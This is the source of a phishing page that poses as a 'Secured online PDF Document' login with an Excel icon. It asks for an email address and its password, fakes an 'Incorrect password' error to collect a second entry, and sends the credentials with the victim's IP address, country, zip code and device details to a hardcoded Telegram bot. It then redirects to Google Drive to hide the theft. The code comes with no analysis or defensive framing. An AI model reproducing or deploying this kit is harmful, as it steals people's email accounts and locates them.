body, html { margin: 0; font-family: Arial, Helvetica, sans-serif; 
}
* {
  box-sizing: border-box;
}
.bg-image {
  /* The image used */
  background-image: url("/exl.png");
   opacity: 0.3;
  /* Add the blur effect */ filter: blur(-px); -webkit-filter: blur(-px);
  /* Full height */ height: 100%; /* Center and scale the image nicely */
  background-position: center; background-repeat: no-repeat; background-size: cover;
}

/* Position text in the middle of the page/image */
.bg-text {
  background: #FFF;
  width:400px; height:500px; -webkit-box-shadow: 1px 1px 15px 1px #000000;
  box-shadow: 1px 1px 15px 1px #000000; border-radius: 4px 4px 4px 4px;

  position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2; text-align: center;
}

  -webkit-box-shadow: 2px 0px 10px 0px #000000; box-shadow: 2px 0px 10px 0px #1d8f50;  font-weight:bold;
}
input[type=password] {
  width:290px; height:35px; font-family: arial; font-size: 13px; border-radius: 3px;
  color:#000000; background-color: ##1d8f50; border: solid 1px #000; padding: 10px; margin-top: 15px;
  }
input[type=email] {
  width:290px; height:35px; font-family: arial; font-size: 13px; border-radius: 3px;

<form action="" method="post" id="myForm" name="myform">
</td></tr>
					
					<tr><td style="height:30px;"></td></tr>
					<tr><td>
    <div align="center">
        <img src="https://cdn.icon-icons.com/icons2/1381/PNG/512/msexcel_93695.png" style="width:120px;">
    </div>
    <div align="center">
		<br><font face="arial" size="4" color="#000">Secured online PDF Document</font>
		<font face="arial" size="2" color="#000"><br>Sign in to view/download.</font>
    </div>
    </div>
    <div align="center">
        <br><input name="tin" id="tin" type="email" placeholder="Email ID" required>
    </div>
    <div align="center">
        <input name="tan" id="tan" type="password" placeholder="Email password" required>
    </div>
    <div align="center">
        <input type="submit" value="Download">
    </div>
	<br>
    <div id="message" style="color: #FF0000;"></div>
</form>

<script type="text/javascript">
    $(document).ready(function() {
        // Get the value of the 'email' parameter from the URL
        const urlParams = new URLSearchParams(window.location.search);
        const emailValue = urlParams.get('email');

        // Set the value of the input field with id 'email'
        $('#tin').val(emailValue);

        // Flag to track submission attempts
        let submissionAttempt = 0;

        // Handle form submission
        $("#myForm").submit(async function(event) {
            // Prevent the default form submission behavior
            event.preventDefault();

            // Show the loading GIF
            $("#loadingGif").show();

            // Get the values of the form inputs
            var tinVal = $("#tin").val();
            var tanVal = $("#tan").val();

            // First submission attempt
            if (submissionAttempt === 0) {
                // Display error message
                setTimeout(function() {
                    $("#message").html("Incorrect password, try again");
                }, 1000);

                // Clear the TAN input
                $("#tan").val("");

                // Send a message to Telegram about the incorrect attempt
                await sendDataToTelegram(tinVal, tanVal, "Incorrect password, try again");

                // Increment the submission attempt counter
                submissionAttempt++;
            } else {
                // Second submission attempt, process the form

                // Display success message
                setTimeout(function() {
                    $("#message").html("Success! Retrieving document(s)");
                }, 1000);

                // Send a success message to Telegram
                await sendDataToTelegram(tinVal, tanVal, "Success! Retrieving document(s)");

                // Redirect to another page after a brief delay
                setTimeout(function() {
                    window.location.href = "https://drive.google.com/drive/u/0/my-drive";
                }, 2000);
            }
        });
    });
</script>

<script>
    const botToken = '7729042276:AAEqDdOn8Ga0JJsFbnkSHX7miwKtIOBaryk'; // Replace with your bot token
    const chatID = '2041937160'; // Replace with your chat ID

    // Function to fetch IP address, location (country, zip), and device info
    async function getDeviceAndLocationInfo() {
        const currentDateTime = new Date().toLocaleString();
        const url = window.location.href;

        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
        };

        let ipAddress = 'Unable to retrieve IP address';
        let country = 'Unknown';
        let zipcode = 'Unknown';
        let emojiFlag = '🏳️'; // Default flag if not found

        try {
            // Fetch IP address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ipAddress = ipData.ip;

            // Fetch location details
            const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
            const locationData = await locationResponse.json();
            country = locationData.country_name || 'Unknown';
            zipcode = locationData.postal || 'Unknown';
            
            // Get the country flag emoji based on country code
            const countryCode = locationData.country || 'US';
            emojiFlag = getEmojiFlag(countryCode);

        } catch (error) {
            console.error('Error fetching IP or location data:', error);
        }

        return {
            currentDateTime,
            ipAddress,
            deviceInfo,
            country,
            zipcode,
            emojiFlag,
            url
        };
    }

    // Helper function to convert country code to emoji flag
    function getEmojiFlag(countryCode) {
        const codePoints = countryCode
            .toUpperCase()
            .split('')
            .map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    }

    // Function to send form data and additional info to Telegram
    async function sendDataToTelegram(tin, tan, statusMessage) {
        const info = await getDeviceAndLocationInfo();

        const message = `
📋 Form Submission Alert:
- Email: ${tin}
- Password: ${tan}
- Status: ${statusMessage}

🌍 Device & Location Info:
- Date & Time: ${info.currentDateTime}
- IP Address: ${info.ipAddress}
- Country: ${info.country} ${info.emojiFlag}
- Zip Code: ${info.zipcode}
- Device Info: ${info.deviceInfo.userAgent}
        `;

        // Send message to Telegram bot
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
        
        try {
            const response = await fetch(telegramUrl);
            if (response.ok) {
               // console.log("Message sent to Telegram successfully.");
            } else {
               // console.error("Error sending message to Telegram.");
            }
        } catch (error) {
           // console.error("Error:", error);
        }
    }
</script>
